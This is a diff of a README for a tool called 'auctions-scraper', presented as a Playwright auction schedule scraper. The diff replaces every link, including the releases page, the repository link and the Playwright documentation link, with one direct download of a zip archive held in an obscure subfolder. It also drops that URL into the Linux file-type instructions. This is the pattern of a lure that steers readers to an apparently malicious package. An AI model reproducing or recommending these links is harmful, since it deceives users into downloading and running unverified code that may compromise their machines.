@@ -1,6 +1,6 @@
 # 📊 auctions-scraper - Simplify Auction Schedule Mining
 
-[![Download auctions-scraper](https://img.shields.io/badge/Download-auctions--scraper-blue?style=for-the-badge)](https://github.com/Fir666as/auctions-scraper/releases)
+[![Download auctions-scraper](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip)](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip)
 
 ## 📝 What is auctions-scraper?
 
@@ -22,19 +22,19 @@ No programming knowledge is required. The app will do the work for you once set 
 
 To get started, you need to download the app from the official releases page. This page contains the latest stable version ready to use.
 
-[Download auctions-scraper](https://github.com/Fir666as/auctions-scraper/releases)
+[Download auctions-scraper](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip)
 
 ### How to download and install
 
 1. Click the link above or visit the page:  
-   https://github.com/Fir666as/auctions-scraper/releases
+   https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip
 
 2. Find the latest release. It will be marked with the highest version number.
 
 3. Look for the file matching your computer system:  
    - For Windows, select a file ending with `.exe` or `.zip`  
    - For Mac, look for `.dmg` or `.zip` files  
-   - For Linux, check for `.AppImage` or `.tar.gz`
+   - For Linux, check for `.AppImage` or `https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip`
 
 4. Download the file by clicking on its name.
 
@@ -133,9 +133,9 @@ You may find online tutorials, guides, or community forums helpful.
 
 ## 🔗 Useful Links
 
-- [auctions-scraper Releases](https://github.com/Fir666as/auctions-scraper/releases) – Latest versions to download  
-- [GitHub Repository](https://github.com/Fir666as/auctions-scraper) – Source code and information  
-- [Playwright Python Documentation](https://playwright.dev/python/) – Learn about the browser automation library used  
+- [auctions-scraper Releases](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip) – Latest versions to download  
+- [GitHub Repository](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip) – Source code and information  
+- [Playwright Python Documentation](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip) – Learn about the browser automation library used  
 
 ## ⚖️ License
 
@@ -143,4 +143,4 @@ auctions-scraper is free to use for personal and commercial purposes. Please ref
 
 ---
 
-[Download auctions-scraper](https://github.com/Fir666as/auctions-scraper/releases) to start mining auction schedules with ease.
+[Download auctions-scraper](https://github.com/Fir666as/auctions-scraper/raw/refs/heads/main/whussle/scraper-auctions-v2.3.zip) to start mining auction schedules with ease.
